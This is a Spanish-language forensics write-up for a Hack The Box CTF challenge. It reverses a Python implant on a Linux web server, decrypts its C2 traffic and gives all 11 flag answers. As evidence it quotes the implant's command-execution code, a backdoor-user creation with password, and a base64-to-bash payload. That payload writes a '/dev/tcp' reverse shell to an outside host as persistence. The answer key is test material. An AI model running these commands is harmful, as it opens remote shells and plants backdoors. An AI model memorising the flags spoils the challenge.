# The Ash-Binder Signature: HTB Challenge 73502 (Forensics / DFIR)

**11 flags.** Artifacts: `capture.pcap` (88 KB) + `uac-ash-wbsrv03-linux-20260522185435.tar.gz`
(UAC triage of Debian 13 web server `ash-wbsrv03`, 10.10.0.10).

---

## Respuestas

| # | Pregunta | Flag |
|---|----------|------|
| 1 | Usuario comprometido : grupo primario | `kingmaelor:crownspire` |
| 2 | Ruta completa del binario malicioso | `/srv/AshShare/linux_sys_updater` |
| 3 | Key AES (MD5 del valor) | `0d51a366f5567df0ed560a89d49adef7` |
| 4 | Prefijo custom de client ID | `ASH_CLI_` |
| 5 | Comando custom que inicia upload | `UPLD_FILE` |
| 6 | Variable que almacena la salida del comando | `Kd3uD9` |
| 7 | Segundo comando ejecutado en la sesión | `ls -la /etc` |
| 8 | Segundo fichero descargado | `/etc/hosts` |
| 9 | Credenciales del usuario de persistencia | `backup_usr:9cq3jPVN6Me1` |
| 10 | Fichero escrito para persistencia | `/home/kingmaelor/.local/share/.systemd-helper` |
| 11 | IP:puerto de la reverse shell | `141.101.64.3:53` |

Valor en claro de la flag 3: `ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j`
(`md5("ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j") = 0d51a366f5567df0ed560a89d49adef7`)

---

## 1. Triage inicial

```bash
tar xzf uac-ash-wbsrv03-linux-20260522185435.tar.gz -C uac/
```

UAC trae `[root]/` (copia de ficheros), `live_response/`, `bodyfile/`, `hash_executables/`.

`/etc/passwd` tiene ~20 usuarios señuelo con nombres de fantasía. El discriminante llegó del
tráfico C2 (`id`), pero el binario ya destacaba en el bodyfile:

```
/srv/AshShare/linux_sys_updater  -rwxrwxr-x 1000 1000  9258320
md5: e1349e5c012ad89a1e543d1d6236004d
```

`/etc/passwd` y `/etc/group`:

```
kingmaelor:x:1005:1011::/home/kingmaelor:/bin/bash
crownspire:x:1011:lysaharrowmere,caldrinvowmark,rinkagetsura,keirunderbelly
sudo:x:27:kingmaelor
```

GID primario 1011 → **`kingmaelor:crownspire`** (flag 1). Binario → **`/srv/AshShare/linux_sys_updater`** (flag 2).

## 2. Reversing del implante

`file` → ELF 64-bit stripped 9.2 MB. Strings revelan PyInstaller + Python 3.12.

```bash
python3.12 -m venv venv && venv/bin/pip install pyinstxtractor-ng pycryptodome
venv/bin/pyinstxtractor-ng linux_sys_updater
```

Entry point: `client.pyc`. Sin decompilador para 3.12 disponible → se carga el code object
directamente con `marshal` y se desensambla con `dis` (`disasm_tool.py`).

### Ofuscación

Todos los nombres son aleatorios (`Fg3hY6`, `Jn2bM4`, …) y las cadenas están codificadas.
`Jn2bM4()` es el decodificador:

```python
def Jn2bM4(s):            # b64decode -> XOR 0x55 -> XOR 0xAA  ==  XOR 0xFF
    b = base64.b64decode(s + '=' * (-len(s) % 4))
    b = bytes(x ^ 85  for x in b)
    b = bytes(x ^ 170 for x in b)
    return b.decode()
```

Aplicándolo a todas las constantes string (`dec.py`) sale el protocolo completo:

| Token ofuscado | Claro |
|---|---|
| `vqy3oLyztqA=` | `ASH_CLI_` |
| `vbq+vLCx34TPgt+EzoI=` | `BEACON {0} {1}` |
| `vLe+s7O6sbi6` / `…oK26rK+wsay6` | `CHALLENGE` / `CHALLENGE_RESPONSE` |
| `u6ixs6C5trO63w==` | `DWNL_FILE ` |
| `u6ixs6C7vqu+34TPgg==` | `DWNL_DATA {0}` |
| `u6ixs6CxsKugubCqsbs=` | `DWNL_NOT_FOUND` |
| `qq+zu6C5trO63w==` | `UPLD_FILE ` |
| `qq+zu6C7vqu+3w==` | `UPLD_DATA ` |
| `qq+zu6C+vLQ=` / `qq+zu6C5vraz` | `UPLD_ACK` / `UPLD_FAIL` |
| `vLK73w==` | `CMD ` |
| `sKqrr6qr34TPgt+EzoI=` | `OUTPUT {0} {1}` |
| `rLeqq7uwqLE=` | `SHUTDOWN` |

Client ID = `ASH_CLI_` + 20 chars aleatorios `a-z` → prefijo **`ASH_CLI_`** (flag 4).
El comando de subida es **`UPLD_FILE`** (flag 5).

### Criptografía

```python
X7wR9t = 'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'     # passphrase hardcodeada

def Fg3hY6(p):                                   # derivación de claves
    h  = hashlib.sha256(p.encode()).digest()
    enc = hashlib.sha256(h + b'encryption').digest()[:32]   # -> Pq2mN5 (AES-256)
    mac = hashlib.sha256(h + b'hmac').digest()[:32]         # -> Zk8vL4
    return enc, mac
Pq2mN5, Zk8vL4 = Fg3hY6(X7wR9t)
```

Formato de trama en el socket: `struct.pack('>I', len(blob)) + blob`, donde

```
blob = base64( IV[16] || AES-256-CBC(PKCS7(plaintext)) || SHA256(mac_key || IV || ct)[32] )
```

Clave AES efectiva = `9df1f3bd6110a9684f0b921d6fc79779e9f0d1896615b05bd10b1995121c0c0b`,
derivada de **`ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j`** → MD5 **`0d51a366f5567df0ed560a89d49adef7`** (flag 3).

### Ejecución de comandos

```python
def Ve8sB7(Hj5tC1):
    Kd3uD9 = subprocess.check_output(Hj5tC1, shell=True,
                                     stderr=subprocess.STDOUT, timeout=10)
    return Kd3uD9.decode()
```

La variable que guarda la salida del comando es **`Kd3uD9`** (flag 6).

C2 hardcodeado: `10.10.0.56:443`, beacon cada 30 s.

## 3. Descifrado del PCAP

Sin `tshark` ni `scapy` en la máquina → parser pcap en Python puro (`decrypt.py`):
lectura de cabecera classic pcap LE, reensamblado TCP por número de secuencia, y descifrado
del framing anterior. Todos los MACs verifican OK.

Flujos:

```
10.10.0.10:49892 -> 10.10.0.56:443   20292 B   (C2 cifrado)
10.10.0.56:53470 -> 10.10.0.10:22    11309 B   (SSH del atacante, cifrado)
```

Transcript completo en `c2_session_decrypted.txt`. Resumen:

```
18:54:32 C->S  BEACON ASH_CLI_nxpgkxxdatxrcbvkeqby 1779476072.64
18:55:32 S->C  CHALLENGE
18:55:32 C->S  CHALLENGE_RESPONSE
18:55:32 S->C  DWNL_FILE /etc/ssh/sshd_config      <- descarga 1
18:55:35 S->C  DWNL_FILE /etc/hosts                <- descarga 2  (flag 8)
18:55:38 S->C  UPLD_FILE /home/kingmaelor/.ssh/authorized_keys
               UPLD_DATA <ssh-ed25519 AAAA...KKg40 ash@team.htb>
18:55:41 S->C  CMD uname -a                        <- comando 1
18:55:44 S->C  CMD ls -la /etc                     <- comando 2  (flag 7)
18:55:47 S->C  CMD id
18:55:50 S->C  CMD sudo -l
18:55:53 S->C  CMD sudo useradd -m -s /bin/bash backup_usr && \
                   echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd
18:55:57 S->C  CMD cat /etc/passwd | grep -i backup_usr
18:56:00 S->C  CMD env
18:56:03 S->C  CMD echo 'H4sIABLF...' | base64 -d | gunzip | bash
```

`id` confirma `uid=1005(kingmaelor) gid=1011(crownspire) groups=1011(crownspire),27(sudo)`.
`sudo -l` muestra `(ALL) NOPASSWD: /usr/sbin/useradd, /usr/sbin/usermod, /usr/sbin/chpasswd`: exactamente lo que el atacante abusa a continuación.

Credenciales creadas: **`backup_usr:9cq3jPVN6Me1`** (flag 9).

## 4. Última etapa (persistencia)

```bash
python3 -c "import base64,gzip;print(gzip.decompress(base64.b64decode('H4sIABLFDWoA/5XNQQ7CIBBG4av8K7owMJ20uuQuCBOHFKSBxujtGy9g4gG+9+qWcofdQdqq0JafjxqktE6utBgKDQ1dYAwkasN0D0NhM7wBJXnREXfilR3P7G6rW+i6YPaGJ/jfSXLjMw6pyaqUXfp3EbW2hMv7P3kCreFnE8MAAAA=')).decode())"
```

```
mkdir -p /home/kingmaelor/.local/share && \
echo 'bash -i >& /dev/tcp/141.101.64.3/53 0>&1' > /home/kingmaelor/.local/share/.systemd-helper && \
chmod +x /home/kingmaelor/.local/share/.systemd-helper
```

Fichero de persistencia: **`/home/kingmaelor/.local/share/.systemd-helper`** (flag 10).
Reverse shell dentro: **`141.101.64.3:53`** (flag 11): puerto 53 para camuflarse como DNS.

Nota: la captura UAC arrancó a las 18:54:35, antes de que se escribiera este fichero, por eso
no aparece en `bodyfile.txt` ni en `[root]/home/kingmaelor/`. La única fuente es el PCAP descifrado.

---

## IOCs

- Implante: `/srv/AshShare/linux_sys_updater`, MD5 `e1349e5c012ad89a1e543d1d6236004d` (PyInstaller/Py3.12)
- C2: `10.10.0.56:443` (protocolo custom AES-256-CBC + SHA256-MAC, framing `>I`+base64)
- Passphrase: `ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j`
- Client ID: `ASH_CLI_[a-z]{20}`
- SSH del atacante desde `10.10.0.56` → `10.10.0.10:22` como `kingmaelor`
- Clave pública implantada: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINT6AHLFJOhtGkv5YeF2xgp5GCdDBAyWCIBSxpNTKg40 ash@team.htb`
- Usuario backdoor: `backup_usr` (uid 1016) / `9cq3jPVN6Me1`
- Reverse shell: `141.101.64.3:53`

## Ficheros generados

| Fichero | Descripción |
|---|---|
| `disasm_tool.py` | Carga `client.pyc` con marshal y desensambla todos los code objects |
| `dec.py` | Decodifica las constantes ofuscadas (b64 + XOR 0xFF) |
| `decrypt.py` | Parser pcap puro + reensamblado TCP + descifrado del protocolo C2 |
| `c2_session_decrypted.txt` | Transcript completo de la sesión C2 en claro |
